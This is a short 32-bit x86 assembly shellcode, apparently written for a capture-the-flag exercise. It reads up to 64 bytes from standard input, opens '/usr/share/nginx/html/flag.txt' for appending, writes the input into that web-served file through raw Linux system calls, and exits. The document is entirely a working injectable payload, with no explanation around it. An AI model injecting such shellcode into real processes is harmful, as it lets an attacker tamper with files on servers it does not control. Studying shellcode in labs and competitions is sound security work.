BITS 32

_start:
    sub esp, 0x40

    ;; read(0, buf, 0x40)
    xor eax, eax
    mov ebx, eax
    mov al, 0x3
    mov ecx, esp
    mov esi, esp
    mov edx, 0x40
    int 0x80

    ;; open('/usr/share/nginx/html/flag.txt'i, flags);
    mov edi, eax
    xor eax, eax
    push eax
    push 0x7478
    push 0x742e6761
    push 0x6c662f6c
    push 0x6d74682f
    push 0x786e6967
    push 0x6e2f6572
    push 0x6168732f
    push 0x7273752f
    mov ebx, esp
    mov al, 0x5
    mov ecx, 1025
    ;; xor ecx, ecx
    ;; xor edx, edx
    int 0x80

    ;; write(fd, buf, 0x40)
    mov ebx, eax
    mov ecx, esi
    mov edx, edi
    mov eax, 0x4
    int 0x80

exit:
    ;; exit(0)
    xor ebx, ebx
    mov eax, ebx
    mov al, 0x1
    int 0x80
    
